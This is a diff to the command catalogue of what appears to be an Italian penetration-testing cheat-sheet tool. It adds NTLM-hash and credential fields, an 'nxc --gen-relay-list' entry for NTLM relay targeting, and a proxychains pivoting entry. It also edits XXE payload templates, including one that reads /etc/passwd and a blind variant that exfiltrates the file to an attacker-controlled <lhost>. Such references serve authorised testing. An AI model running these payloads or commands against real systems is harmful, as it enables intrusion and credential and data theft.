@@ -575,6 +575,11 @@ const COMMANDS = [
         "label": "Domain",
         "ctx": "domain",
         "placeholder": "example.com"
+      },
+      {
+        "key": "hash",
+        "label": "Hash favicon",
+        "placeholder": "-247388890"
       }
     ],
     "variants": [
@@ -1664,6 +1669,11 @@ const COMMANDS = [
         "label": "Domain",
         "ctx": "domain",
         "placeholder": "example.com"
+      },
+      {
+        "key": "ip",
+        "label": "Nameserver",
+        "placeholder": "10.10.10.11"
       }
     ],
     "variants": [
@@ -1812,7 +1822,8 @@ const COMMANDS = [
       {
         "key": "user",
         "label": "Utente",
-        "placeholder": "ftpuser"
+        "placeholder": "ftpuser",
+        "ctx": "user"
       },
       {
         "key": "pass",
@@ -1906,7 +1917,8 @@ const COMMANDS = [
       {
         "key": "user",
         "label": "Utente",
-        "placeholder": "ftpuser"
+        "placeholder": "ftpuser",
+        "ctx": "user"
       },
       {
         "key": "pass",
@@ -2545,6 +2557,12 @@ const COMMANDS = [
         "label": "Password",
         "ctx": "password",
         "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "hash",
+        "label": "Hash NTLM",
+        "placeholder": "aad3b435...",
+        "ctx": "hash"
       }
     ],
     "variants": [
@@ -3630,6 +3648,12 @@ const COMMANDS = [
         "label": "Password",
         "ctx": "password",
         "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "hash",
+        "label": "Hash NTLM",
+        "placeholder": "aad3b435...",
+        "ctx": "hash"
       }
     ],
     "variants": [
@@ -5130,6 +5154,12 @@ const COMMANDS = [
         "label": "Password",
         "ctx": "password",
         "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "hash",
+        "label": "Hash NTLM",
+        "placeholder": "aad3b435...",
+        "ctx": "hash"
       }
     ],
     "variants": [
@@ -5426,12 +5456,14 @@ const COMMANDS = [
       {
         "key": "user",
         "label": "User",
-        "placeholder": "admin"
+        "placeholder": "admin",
+        "ctx": "user"
       },
       {
         "key": "password",
         "label": "Password",
-        "placeholder": "admin"
+        "placeholder": "admin",
+        "ctx": "password"
       },
       {
         "key": "ip",
@@ -5550,7 +5582,8 @@ const COMMANDS = [
       {
         "key": "hash",
         "label": "Nome parametro",
-        "placeholder": "dcfdd5e021a869fcc6dfaef8bf31377e"
+        "placeholder": "dcfdd5e021a869fcc6dfaef8bf31377e",
+        "ctx": "hash"
       },
       {
         "key": "node",
@@ -5977,7 +6010,7 @@ const COMMANDS = [
       "xxe",
       "xml"
     ],
-    "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<root>&xxe;</root>",
+    "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
     "params": [
       {
         "key": "lhost",
@@ -5989,13 +6022,13 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Basic (file read)",
-        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<root>&xxe;</root>",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
         "description": "Legge `/etc/passwd` se l’app riflette il valore dell’entità in risposta."
       },
       {
         "id": "blind",
         "label": "Blind OOB",
-        "template": "<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n]>\n<root>&send;</root>",
+        "template": "<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n]>\n<xxe-root>&send;</xxe-root>",
         "description": "`xxe.dtd` ospitato da te: `<!ENTITY send SYSTEM \"http://<lhost>/?data=%file;\">`, esfiltra via HTTP quando l’output non è mostrato."
       },
       {
@@ -7192,6 +7225,12 @@ const COMMANDS = [
         "label": "Target",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "hash",
+        "label": "Hash NTLM",
+        "placeholder": "aad3b435...",
+        "ctx": "hash"
       }
     ],
     "variants": [
@@ -9280,6 +9319,62 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "nxc-gen-relay-list",
+    "name": "nxc smb — target senza SMB signing",
+    "category": "active-directory",
+    "subcategory": "initial-access",
+    "group": "NTLM Relay",
+    "description": "Enumera la subnet e scrive su file gli host con SMB signing non obbligatorio, gli unici verso cui un relay NTLM può concludersi. Il file prodotto si passa direttamente a ntlmrelayx con -tf. Senza questa selezione il relay fallisce sugli host che impongono la firma, senza un errore esplicito.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "smb"
+    ],
+    "tags": [
+      "nxc",
+      "netexec",
+      "relay",
+      "signing",
+      "ntlm"
+    ],
+    "template": "nxc smb <subnet> --gen-relay-list targets.txt",
+    "params": [
+      {
+        "key": "subnet",
+        "label": "Subnet",
+        "placeholder": "10.10.10.0/24"
+      },
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Subnet intera",
+        "template": "nxc smb <subnet> --gen-relay-list targets.txt",
+        "description": "Sweep della subnet: il modo normale di costruire la lista dei bersagli prima di avviare il relay."
+      },
+      {
+        "id": "single",
+        "label": "Host singolo",
+        "template": "nxc smb <ip> --gen-relay-list targets.txt",
+        "description": "Verifica il signing su un solo host, utile per confermare un bersaglio già individuato."
+      }
+    ],
+    "refs": [
+      {
+        "label": "NetExec — SMB",
+        "url": "https://www.netexec.wiki/smb-protocol"
+      }
+    ]
+  },
+  {
     "id": "ntlmrelayx-smb",
     "name": "ntlmrelayx — relay SMB",
     "category": "active-directory",
@@ -11085,6 +11180,18 @@ const COMMANDS = [
         "key": "parentdc",
         "label": "Parent DC (FQDN)",
         "placeholder": "dc.corp.local"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "placeholder": "jdoe",
+        "ctx": "user"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "placeholder": "P@ssw0rd",
+        "ctx": "password"
       }
     ],
     "variants": [
@@ -11252,6 +11359,12 @@ const COMMANDS = [
         "label": "Target",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "hash",
+        "label": "Hash NTLM",
+        "placeholder": "aad3b435...",
+        "ctx": "hash"
       }
     ],
     "variants": [
@@ -11315,6 +11428,12 @@ const COMMANDS = [
         "label": "Target",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "hash",
+        "label": "Hash NTLM",
+        "placeholder": "aad3b435...",
+        "ctx": "hash"
       }
     ],
     "variants": [
@@ -11431,6 +11550,12 @@ const COMMANDS = [
         "label": "Target",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "hash",
+        "label": "Hash NTLM",
+        "placeholder": "aad3b435...",
+        "ctx": "hash"
       }
     ],
     "variants": [
@@ -11896,45 +12021,57 @@ const COMMANDS = [
     ]
   },
   {
-    "id": "proxychains",
-    "name": "proxychains — usa il tunnel",
-    "category": "lateral",
-    "subcategory": "pivoting",
-    "group": "SOCKS Pivot",
-    "description": "Instrada un tool attraverso il SOCKS del pivot. In `/etc/proxychains4.conf`: `dynamic_chain` + `socks5 127.0.0.1 1080`. Solo TCP, usa `-sT -Pn` con nmap.",
-    "platform": "linux",
-    "requires": [
-      "shell"
-    ],
-    "protocols": [],
-    "tags": [
-      "proxychains",
-      "socks",
-      "pivot"
-    ],
-    "template": "proxychains -q nmap -sT -Pn -p- --min-rate 5000 <targetip>",
-    "params": [
-      {
-        "key": "targetip",
-        "label": "Target interno",
-        "placeholder": "172.16.8.50"
-      }
-    ],
-    "variants": [
-      {
-        "id": "default",
-        "label": "nmap",
-        "template": "proxychains -q nmap -sT -Pn -p- --min-rate 5000 <targetip>",
-        "description": "Scan TCP attraverso il proxy."
-      },
-      {
-        "id": "nxc",
-        "label": "nxc",
-        "template": "proxychains -q nxc smb <targetip> -u '<user>' -p '<password>' --shares",
-        "description": "Qualsiasi tool TCP funziona dietro `proxychains`."
-      }
-    ]
-  },
+      "id": "proxychains",
+      "name": "proxychains — usa il tunnel",
+      "category": "lateral",
+      "subcategory": "pivoting",
+      "group": "SOCKS Pivot",
+      "description": "Instrada un tool attraverso il SOCKS del pivot. In `/etc/proxychains4.conf`: `dynamic_chain` + `socks5 127.0.0.1 1080`. Solo TCP, usa `-sT -Pn` con nmap.",
+      "platform": "linux",
+      "requires": [
+        "shell"
+      ],
+      "protocols": [],
+      "tags": [
+        "proxychains",
+        "socks",
+        "pivot"
+      ],
+      "template": "proxychains -q nmap -sT -Pn -p- --min-rate 5000 <targetip>",
+      "params": [
+        {
+          "key": "targetip",
+          "label": "Target interno",
+          "placeholder": "172.16.8.50"
+        },
+        {
+          "key": "user",
+          "label": "User",
+          "ctx": "user",
+          "placeholder": "jdoe"
+        },
+        {
+          "key": "password",
+          "label": "Password",
+          "ctx": "password",
+          "placeholder": "P@ssw0rd"
+        }
+      ],
+      "variants": [
+        {
+          "id": "default",
+          "label": "nmap",
+          "template": "proxychains -q nmap -sT -Pn -p- --min-rate 5000 <targetip>",
+          "description": "Scan TCP attraverso il proxy."
+        },
+        {
+          "id": "nxc",
+          "label": "nxc",
+          "template": "proxychains -q nxc smb <targetip> -u '<user>' -p '<password>' --shares",
+          "description": "Qualsiasi tool TCP funziona dietro `proxychains`."
+        }
+      ]
+    },
   {
     "id": "socat-relay",
     "name": "socat — relay sul pivot",
